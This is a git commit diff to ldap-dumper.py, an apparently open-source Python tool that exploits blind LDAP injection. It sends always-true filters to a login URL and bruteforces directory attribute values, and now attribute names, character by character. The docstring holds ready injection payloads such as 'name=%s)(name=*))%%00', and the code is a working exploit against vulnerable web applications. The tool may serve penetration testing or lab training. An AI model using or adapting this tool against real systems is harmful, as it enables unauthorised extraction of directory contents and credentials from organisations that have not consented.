0804261e00ee8ecfaf068d1bfb11229e68f0c7d7
Your Name <you@example.com>
2013-12-03 16:56:50 +1300

    added attribute bruteforcing.

--- ldap-dumper.py
+++ ldap-dumper.py
@@ -1,5 +1,6 @@
 """
-example:
+Example:
+
 python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password=' 'AUTHENTICATED as'
 
 In this example, we inserted an expression into the param that will always
@@ -9,17 +10,25 @@ when %s is TRUE, and will not return it when FALSE.
 
 Strings inserted look like 'a*', 'b*', 'c*'
 
-Some LDAP attributes do not support wildcards, in which case you should use --no-wildcard
+Non-wildcard example:
 
-non-wildcard example:
-python ldap-dumper.py -N -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
+python ldap-dumper.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
-In this example, note how the %s needs to be placed right at the end of an
-always-true filter and its respective close parenthesis.
+Some LDAP attributes do not support wildcards, in which case you should use
+--no-wildcard. In this example, note how the %s needs to be placed right at the
+end of an always-true filter and its respective close parenthesis.
 
 Strings inserted look like
 "(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
 (trimmed for brevity)
+
+Bruteforcing attributes:
+
+python ldap-dumper.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
+
+Recommend only using -c 'lower', since using digits can cause invalid
+attributes (like '9c') to be mixed with valid attributes, which is not handled
+properly at all.
 
 NOTE: Remember to quote the URL because bash! And also remember that % needs to
 be escaped as %%, because python/printf.
@@ -41,12 +50,15 @@ http://www.ietf.org/rfc/rfc1960.txt
 import argparse, logging, string, requests, sys, itertools, timeit
 
 class LdapGlobals():
+    BRUTE = "BRUTE"
     start_time = timeit.default_timer()
+    total_progress_calls = 0
     total_requests = 0
 
 LDAP_GLOBALS = LdapGlobals()
 
 def request_true(url, true_string):
+    progress_indicate()
     LDAP_GLOBALS.total_requests += 1
     logging.debug(url)
     response = requests.get(url)
@@ -101,9 +113,13 @@ def brute(base_url, true_string, charset):
 def or_generate(charset, space_per_request, attribute_name, word_size, size_is_exact):
     or_base = "(|%s)"
     or_base_len = len(or_base) - 2
-
-    attr_base = "(%s=%s)"
     real_free = space_per_request - or_base_len
+    bruting_attr = attribute_name == LDAP_GLOBALS.BRUTE
+
+    if bruting_attr:
+        attr_base = "(%s=*)"
+    else:
+        attr_base = "(%s=%s)"
 
     if not size_is_exact:
         i = 0
@@ -115,7 +131,11 @@ def or_generate(charset, space_per_request, attribute_name, word_size, size_is_e
         i += 1
         possibilities = itertools.product(charset, repeat=i)
         for poss in possibilities:
-            val = attr_base % (attribute_name, "".join(poss))
+
+            if bruting_attr:
+                val = attr_base % "".join(poss)
+            else:
+                val = attr_base % (attribute_name, "".join(poss))
 
             # too large! flush
             if len(tmp) + len(val) > real_free :
@@ -139,9 +159,20 @@ def or_loop(or_subfilter):
         if spl != "":
             yield spl + ")"
 
+def progress_indicate():
+    LDAP_GLOBALS.total_progress_calls += 1
+    #print(LDAP_GLOBALS.total_progress_calls)
+    if LDAP_GLOBALS.total_progress_calls % 50 == 0:
+        print(str(LDAP_GLOBALS.total_progress_calls) + "...")
+
 # all parameters are arguments gotten from the command line.
 def brute_nowild(base_url, true_string, charset, max_path_size, attribute_name, word_size, size_is_exact):
-    logging.info("Entering non-wildcard mode for URL '%s' (bruteforcing '%s')." % (base_url, attribute_name))
+    bruting_attr = attribute_name == LDAP_GLOBALS.BRUTE
+    if bruting_attr:
+        logging.info("entering non-wildcard mode for url '%s' (bruteforcing attribute names)." % base_url)
+    else:
+        logging.info("entering non-wildcard mode for url '%s' (bruteforcing '%s')." % (base_url, attribute_name))
+
     logging.debug("Going to brute with chars %s up to %s length" % (charset, word_size))
 
     # we are going to do (|(cn="a")(cn="b")[...]) until max_path_size so as to know if any of the
@@ -154,8 +185,13 @@ def brute_nowild(base_url, true_string, charset, max_path_size, attribute_name, 
         if request_true(url, true_string):
             looper = or_loop(or_subfilter)
             for filt in looper:
+
                 if request_true(base_url % filt, true_string):
-                    found = filt[len(attribute_name)+2:-1]
+                    if not bruting_attr:
+                        found = filt[len(attribute_name)+2:-1]
+                    else:
+                        found = filt.split("=")[0][1:]
+
                     logging.info("Found value %s" % found)
                     exist.append(found)
 
@@ -182,22 +218,26 @@ def parser_get():
 
     parser.add_argument("--charset", "-c", help="""The set of characters the
         script will attempt to use while bruteforcing.""",
-        choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex', 'digits'],
+        choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex', 'digits', 'lower'],
         default="lower_and_digit")
     parser.add_argument("--verbosity", "-v", type=int, help="0 warn, 1 info, 2 debug", default=1)
     parser.add_argument("--charset-custom", "-C", help="""A custom string that
-    contains all the charcters to use. E.g. '-C ABC389'""")
+        contains all the charcters to use. E.g. '-C ABC389'""")
 
     parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
         honor the wildcard. These need to be bruteforced without a wildcard, which
         is much slower.""", action="store_true")
+    parser.add_argument("--brute-attr", '-A', help="""Bruteforce attribute
+        names instead of values. Similar to -N, but it bruteforces attributes
+        instead. All options that only work with non-wildcard also work with
+        this""", action="store_true")
+
     parser.add_argument('--max-path-size', help="""For non-wildcard only: for
         bruteforcing DN names, which don't support wildcards, we create massive
         filters like (!(val=value1)(val=value2))[...] to be more efficient. This
         defines how long requests will be.""", default=8100)
     parser.add_argument("--attribute-name", "-a", help="""Required for
         non-wildcard bruteforcing.""")
-
     group = parser.add_mutually_exclusive_group()
     group.add_argument("--max-word-size", help="""For wildcard only: the max
         max length we are going to attempt to bruteforce.""", type=int, default=6)
@@ -215,6 +255,8 @@ def charset_get(charset_name):
         charset = string.hexdigits
     elif charset_name == "digits":
         charset = string.digits
+    elif charset_name == "lower":
+        charset = string.ascii_lowercase
 
     return charset
 
@@ -247,11 +289,15 @@ if __name__ == '__main__':
     else:
         charset = charset_get(args.charset)
 
-    if not args.no_wildcard:
+    if not args.no_wildcard and not args.brute_attr:
         valid_values = brute(args.URL, args.TRUE_STRING, charset)
     else :
+        if args.brute_attr:
+            attr = LDAP_GLOBALS.BRUTE
+        else:
+            attr = args.attribute_name
 
-        if not args.attribute_name :
+        if not attr:
             err("Attribute name is required for non-wildcard bruteforcing. Please specify it with --attribute-name.")
 
         if args.exact_word_size != None:
@@ -263,7 +309,7 @@ if __name__ == '__main__':
 
         valid_values = brute_nowild(base_url=args.URL,
             true_string=args.TRUE_STRING, charset=charset,
-            max_path_size=args.max_path_size, attribute_name=args.attribute_name,
+            max_path_size=args.max_path_size, attribute_name=attr,
             word_size=word_size, size_is_exact=is_exact)
 
     succ(valid_values)
